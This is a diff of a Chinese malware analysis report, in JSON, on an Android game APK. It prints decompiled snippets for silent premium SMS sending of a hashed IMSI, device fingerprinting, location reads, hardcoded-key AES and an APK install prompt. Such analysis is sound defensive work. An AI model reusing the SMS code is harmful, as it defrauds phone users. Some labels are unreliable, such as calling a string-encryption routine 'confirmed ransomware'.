@@ -6,7 +6,7 @@
     "应用名": "刀剑情缘",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 436.8
+    "分析耗时(秒)": 800.4
   },
   "行为列表": [
     {
@@ -40,7 +40,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "String imsi = MMClientSDK_ForLogin.getDigest(Constant.HASH_MD5, this.deviceInfo.getStrImsi());\nString msg = String.format(\"GDWLANIDP#%s#%s:%s\", imsi, getSessionID(), this.userProfile.appID);\nSmsManager smsManager = SmsManager.getDefault();\nsmsManager.sendTextMessage(\"10658682803\", null, msg, null, null);",
           "malicious_code_snippet_context": "      }\n  \n      public String registerIdentity() {\n>>>         String imsi = MMClientSDK_ForLogin.getDigest(Constant.HASH_MD5, this.deviceInfo.getStrImsi());\n>>>         String msg = String.format(\"GDWLANIDP#%s#%s:%s\", imsi, getSessionID(), this.userProfile.appID);\n>>>         SmsManager smsManager = SmsManager.getDefault();\n>>>         smsManager.sendTextMessage(\"10658682803\", null, msg, null, null);\n          Log.v(this.TAG, \"send sms:\" + msg + \" to:10658682803\");\n          return msg;\n      }",
-          "behavior_description": "代码获取设备IMSI并进行MD5哈希处理，结合会话ID和应用ID拼接成特定格式的短信内容，随后在用户无感知的情况下通过SmsManager静默发送至指定号码10658682803，可能导致用户被扣取短信费用或泄露隐私标识。",
+          "behavior_description": "registerIdentity()方法读取设备IMSI并做MD5哈希，与SessionID、appID拼接为'GDWLANIDP#...'格式的短信内容，随后调用SmsManager.sendTextMessage()在完全无用户感知、无任何确认界面的情况下静默发送到指定号码10658682803。数据流向：设备IMSI(deviceInfo.getStrImsi())→MD5哈希→拼接会话ID与应用ID→静默短信外发。该行为绕过用户交互直接发送短信，可能产生短信资费消耗，并将设备身份标识与 会话信息泄露给外部号码，属于典型的静默短信发送欺诈行为。",
           "glm_analyzed": true
         }
       ]
@@ -68,9 +68,9 @@
           "malicious_behavior": "device_fingerprinting",
           "behavior_type": "grayware",
           "risk_level": "中",
-          "malicious_code_snippet": "public String getDeviceID() {\n    if (this.deviceInfo == null) {\n        GetDeviceInfo getDevInfo = new GetDeviceInfo();\n        this.deviceInfo = getDevInfo.getDeviceInfo(this.context, this.userProfile.cardSlot);\n    }\n    if (this.deviceInfo == null) {\n        return null;\n    }",
-          "malicious_code_snippet_context": "          return result;\n      }\n  \n>>>     public String getDeviceID() {\n>>>         if (this.deviceInfo == null) {\n>>>             GetDeviceInfo getDevInfo = new GetDeviceInfo();\n>>>             try {\n>>>                 this.deviceInfo = getDevInfo.getDeviceInfo(this.context, this.userProfile.cardSlot);\n>>>             } catch (ClientSDKException e) {\n>>>                 e.printStackTrace();\n>>>             }\n          }\n          if (this.deviceInfo == null) {\n              return null;",
-          "behavior_description": "该方法通过实例化GetDeviceInfo并调用getDeviceInfo()，传入Context和cardSlot参数来采集设备指纹信息（如IMEI、IMSI、设备型号等），采集结果缓存在deviceInfo字段中并通过getDeviceID()返回。数据流向为：设备硬件标识(source)→本地缓存并暴露给调用方(sink)，属于过度收集设备隐私信息的行为，在已确认的恶意样本中通常作为设备追踪与用户画像构建的前置步骤。",
+          "malicious_code_snippet": "public String getDeviceID() {\n    if (this.deviceInfo == null) {\n        GetDeviceInfo getDevInfo = new GetDeviceInfo();\n        this.deviceInfo = getDevInfo.getDeviceInfo(this.context, this.userProfile.cardSlot);\n    }\n    if (this.deviceInfo == null) {\n        return null;\n    }\n    ...",
+          "malicious_code_snippet_context": "          return result;\n      }\n  \n>>>     public String getDeviceID() {\n>>>         if (this.deviceInfo == null) {\n>>>             GetDeviceInfo getDevInfo = new GetDeviceInfo();\n>>>             try {\n>>>                 this.deviceInfo = getDevInfo.getDeviceInfo(this.context, this.userProfile.cardSlot);\n>>>             } catch (ClientSDKException e) {\n>>>                 e.printStackTrace();\n>>>             }\n>>>         }\n          if (this.deviceInfo == null) {\n              return null;\n          }",
+          "behavior_description": "该代码属于设备指纹采集模块：getDeviceID() 方法通过 GetDeviceInfo.getDeviceInfo(context, cardSlot) 读取设备硬件标识及 SIM 卡槽相关的设备唯一标识信息（如 IMEI/IMSI 类设备指纹），并缓存到 this.deviceInfo 字段中，随后将设备 ID 返回给上层调用方。数据流向为：设备硬件标识/SIM 卡信息 → GetDeviceInfo 读取并缓存 → getDeviceID() 返回给调用方，可用于设备指纹标识与用户追踪。该片段本身未见直接网络外传，属于过度收集设备隐私标识的灰色行为，但在已确认恶意的 APK 环境中，采集到的设备指纹可能被上层模块用于上传或追踪。",
           "glm_analyzed": true
         }
       ]
@@ -95,37 +95,80 @@
           "malicious_behavior": "location_tracking",
           "behavior_type": "grayware",
           "risk_level": "中",
-          "malicious_code_snippet": "public static GamePos getLastKnownPos() {\n    if (a != null) {\n        return a;\n    }\n    return null;\n}",
-          "malicious_code_snippet_context": "          return AndroidPosProvider.getAndroidLocationProviderInstance(criteria);\n      }\n  \n>>>     public static GamePos getLastKnownPos() {\n>>>         if (a != null) {\n>>>             System.out.println(\"getLastKnownLocation:lastKnownLocation:\" + a);\n>>>             return a;\n>>>         }\n>>>         System.out.println(\"getLastKnownLocation:no last known location. Neither getLocation() nor a LocationListener was ever called.\");\n          return null;\n      }\n  ",
-          "behavior_description": "该代码通过getLastKnownPos()方法获取并返回设备最后已知的位置信息。位置数据来源于Android位置服务（通过AndroidPosProvider.getAndroidLocationProviderInstance获取），缓存在静态变量a中，调用getLastKnownPos()时直接返回该缓存位置数据，属于位置追踪/隐私收集行为。在已确认的恶意样本中，该位置数据可能被进一步窃取或上报至C2服务器。",
+          "malicious_code_snippet": "public static GamePosProvider getInstance(Criteria criteria) {\n    return AndroidPosProvider.getAndroidLocationProviderInstance(criteria);\n}\npublic static GamePos getLastKnownPos() {\n    if (a != null) {\n        return a;\n    }\n    return null;\n}",
+          "malicious_code_snippet_context": "      public static void addProximityListener(ProximityListener proximityListener, Coordinates coordinates, float f) throws GamePosException {\n      }\n  \n>>>     public static GamePosProvider getInstance(Criteria criteria) throws GamePosException {\n>>>         return AndroidPosProvider.getAndroidLocationProviderInstance(criteria);\n>>>     }\n>>> \n>>>     public static GamePos getLastKnownPos() {\n>>>         if (a != null) {\n>>>             System.out.println(\"getLastKnownLocation:lastKnownLocation:\" + a);\n>>>             return a;\n>>>         }\n          System.out.println(\"getLastKnownLocation:no last known location. Neither getLocation() nor a LocationListener was ever called.\");\n          return null;\n      }",
+          "behavior_description": "该代码是J2ME位置API在Android上的兼容封装层（GamePosProvider），通过AndroidPosProvider.getAndroidLocationProviderInstance()桥接Android系统定位服务，getLastKnownPos()读取缓存变量a中保存的最近一次用户位置并返回给上层调用者。数据流向：Android定位服务（source）→ 缓存变量a（setLastKnownPos写入）→ getLastKnownPos()返回给调用方。片段本身未发现网络外传、短信发送等直接危险sink，属于位置数据读取入口；但在已确认恶意的样本中，该封装为上层代码提供了持续获取用户地理位置的能力，存在位置隐私被过度收集和利用的风险，需结合调用方行为判断最终危害。",
           "glm_analyzed": true
         }
       ]
     },
     {
-      "行为": "file_access",
-      "中文名": "文件访问/窃取",
-      "MITRE": "",
-      "置信度": "likely",
-      "证据": {
-        "方法引用": [],
-        "权限": [
-          "android.permission.WRITE_EXTERNAL_STORAGE"
-        ],
-        "字符串": [
-          "getExternalStorageDirectory"
-        ]
-      },
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
       "恶意代码": [
         {
-          "class_path": "Lcom\\example\\smalitest\\HdkFileUtils;",
-          "method_signature": "?(?)",
-          "malicious_behavior": "file_access",
+          "class_path": "Lcom\\chinaMobile\\d;",
+          "method_signature": "for(int i = 0; i < bytes.length && i < bArr.length; i++)",
+          "malicious_behavior": "ransomware",
           "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "byte[] bytes = \"134e3265829ff82daf16e7b740a600b5\".getBytes();\nbyte[] bArr = new byte[16];\nfor (int i = 0; i < bytes.length && i < bArr.length; i++) {\n    bArr[i] = bytes[i];\n}\nthis.b = new SecretKeySpec(bArr, \"AES\");\nCipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\ncipher.init(1, this.b, new IvParameterSpec(\"0102030405060708\".getBytes()));\nreturn b(new h().a(cipher.doFinal(str.getBytes())));",
+          "malicious_code_snippet_context": "  \n      public final byte[] a(String str) throws BadPaddingException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, InvalidKeyException, InvalidAlgorithmParameterException {\n          if (this.b == null) {\n>>>             byte[] bytes = \"134e3265829ff82daf16e7b740a600b5\".getBytes();\n>>>             byte[] bArr = new byte[16];\n>>>             for (int i = 0; i < bytes.length && i < bArr.length; i++) {\n>>>                 bArr[i] = bytes[i];\n>>>             }\n>>>             this.b = new SecretKeySpec(bArr, \"AES\");\n>>>         }\n>>>         Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n>>>         cipher.init(1, this.b, new IvParameterSpec(\"0102030405060708\".getBytes()));\n          return b(new h().a(cipher.doFinal(str.getBytes())));\n      }\n  }",
+          "behavior_description": "该代码从硬编码字符串\"134e3265829ff82daf16e7b740a600b5\"截取前16字节构造AES密钥，并使用硬编码IV\"0102030405060708\"初始化AES/CBC/PKCS5Padding加密器，随后对传入的明文数据str执行cipher.doFinal()加密，密文经编码转换后返回。数据流向：待加密明文数据(str.getBytes()) → AES-CBC硬编码密钥加密(cipher.doFinal()) → 密文输出。密钥与IV均硬编码在代码中，攻击者完全掌握解密能力且无需与受害者交互；结合该样本为伪装中国移动的已确认恶意APK（malradar勒索样本），此加密逻辑用于对用户文件/数据进行加密以实施勒索或隐蔽数据操作，直接造成用户数据不可用。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lsafiap\\framework\\sdk\\b\\d;",
+          "method_signature": "if(context != null && file != null)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
           "risk_level": "中",
-          "malicious_code_snippet": "private static final String savePath = Environment.getExternalStorageDirectory() + \"/sysRecord/\";\n    private static final String saveFileName = String.valueOf(savePath) + \"syRecord.dat\";\n\n    public static void handleThefile() {\n        File file = new File(savePath);\n        if (!file.exists()) {\n            file.mkdir();\n        }\n        mdataFile = new File(saveFileName);\n    }",
-          "malicious_code_snippet_context": "      private static File mdataFile;\n      public static int mpoints;\n      public static int mtimes;\n>>>     private static final String savePath = Environment.getExternalStorageDirectory() + \"/sysRecord/\";\n>>>     private static final String saveFileName = String.valueOf(savePath) + \"syRecord.dat\";\n>>> \n>>>     public static void handleThefile() {\n>>>         File file = new File(savePath);\n>>>         if (!file.exists()) {\n>>>             file.mkdir();\n>>>         }\n>>>         mdataFile = new File(saveFileName);\n>>>     }\n  \n      public static void writeThefile(int times, int point) {\n          mtimes += times;",
-          "behavior_description": "代码在外部存储中创建名为\"sysRecord\"的伪装目录，并在其中创建\"syRecord.dat\"文件。文件名刻意伪装成系统记录文件，具有隐蔽性，可能用于隐蔽存储窃取的用户隐私数据或恶意配置信息，避免被用户发现。",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.VIEW\");\nintent.setDataAndType(Uri.fromFile(file), \"application/vnd.android.package-archive\");\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "  \n      public static void a(Context context, File file) {\n          if (context != null && file != null) {\n>>>             Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>             intent.setDataAndType(Uri.fromFile(file), \"application/vnd.android.package-archive\");\n>>>             intent.addFlags(268435456);\n>>>             context.startActivity(intent);\n          }\n      }\n  ",
+          "behavior_description": "该代码接收一个File对象（通常是下载到本地的APK文件），构造ACTION_VIEW的Intent并将MIME类型设置为application/vnd.android.package-archive，添加FLAG_ACTIVITY_NEW_TASK(268435456)标志后调用startActivity启动系统安装器界面，提示用户安装该APK。数据流向：本地APK文件(File) → Uri.fromFile() → setDataAndType指定APK类型 → startActivity调起系统包安装器。注意：该方式并非真正的静默安装（未使用root权限、pm install命令或PackageInstaller API），安装仍需用户在系统弹窗中点击确认；但在已确认恶意的样本中，此类代码通常作为dropper（投放器）组件，配合后台下载的APK诱导用户安装附加恶意载荷，属于隐蔽推广/诱导安装行为。",
           "glm_analyzed": true
         }
       ]
@@ -138,7 +181,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
